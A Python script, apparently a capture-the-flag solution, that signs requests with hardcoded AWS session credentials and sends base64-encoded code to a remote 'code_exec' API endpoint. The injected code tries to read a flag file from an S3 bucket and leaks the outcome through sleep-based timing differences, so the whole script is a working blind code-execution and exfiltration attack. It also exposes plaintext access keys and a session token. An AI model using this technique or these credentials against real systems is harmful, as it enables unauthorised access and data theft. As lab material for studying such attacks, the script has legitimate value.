import base64
import requests
import time
from aws_requests_auth.aws_auth import AWSRequestsAuth

auth = AWSRequestsAuth(aws_access_key="ASIARYWSMSYIOLOPQDID",
                       aws_secret_access_key="fzVE7H2+LqCvSNDLNzb1qS7oNEgVmwUm6T4ykuhq",
                       aws_token="IQoJb3JpZ2luX2VjELf//////////wEaDGlsLWNlbnRyYWwtMSJIMEYCIQDbv8K6aDIK9hgYAX96Cy3KWnf1nV6CK4zSOHtFYxRSzwIhAO6mXPFjyZd+6TRZsMIwtXohzOCURYNPdJqLl/uzdiyQKrUCCCQQABoMMTIxNzc0MDUyODgwIgwgxonHTHHAlDodO9wqkgJx7w+jK4uqQZAWDUqG7wlZ0IGc+cypxmsZ2PuPd1TWtwFF4Vv0MaCadKDdi49HdvpTY7KA+FQDtpJWBk2gmHkf9xpvMK4F5py+qG0lY7UalW/0OBGBfU2xb7YGzxmZF9w2TpqAj7HBEP07bhqST0ViU2ODIvf+5NMbDHYnhoOsYk2E1OPadWGQrakz6poU2+kTlvpA0bNCpR8sVZ6nz7FddcgJJmREMSdYMr+WJ3L3GNbiXihQT6Bzf1+IyItX7pgfhD2xpRSTFuePD9PeWMr3ASGt8ZSaOQDNBORnDUytLPGAYwBFdQZpl30pBnHA8vUZFFiRDdNNMs/HmHBH1dpN+yVtCNn/QnibHS2z6kA+n2OsMIOjzNMGOpwBypSEq9f7dXcHc58gHPJwbsnXkYmhe3joODue97MM0EHT9q1Ts6mkhrhJkvcIFPIlIwa6dYuWLiKxkbh80fSCOYuEHmzqkrynYFofo/BOxZ93fx1HlLeZji+uXDVLq8Z4kVuUu5DMkOKqvoFFPtZmFneh8sbN3NBvBPxgFD+KoLEuLJJzmYmg0zLO/cCE8VaNNVrVtIGQGJw6FVw1",
                       aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
                       aws_region='us-east-1',
                       aws_service='execute-api')

url = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

code = """
import boto3
from botocore import UNSIGNED
from botocore.config import Config
import time

s3 = boto3.client('s3', config=Config(signature_version=UNSIGNED, user_agent='REDACTED'))

start = time.time()
try:
    response = s3.get_object(Bucket='userd8a2f72fe43094e8', Key='flag.txt')
    val = response['Body'].read().decode('utf-8')
except Exception as e:
    val = str(e)
end = time.time()

if "AccessDenied" in val:
    time.sleep(1) # 403
elif "NoSuchKey" in val:
    time.sleep(2) # 404
else:
    if "time" in val.lower() or "connect" in val.lower():
        time.sleep(3) # Timeout
    else:
        time.sleep(4) # Success
"""
encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
start = time.time()
res = requests.post(url, json={"code": encoded_code}, auth=auth, timeout=10)
elapsed = time.time() - start
print(f"Elapsed: {elapsed:.2f}s")
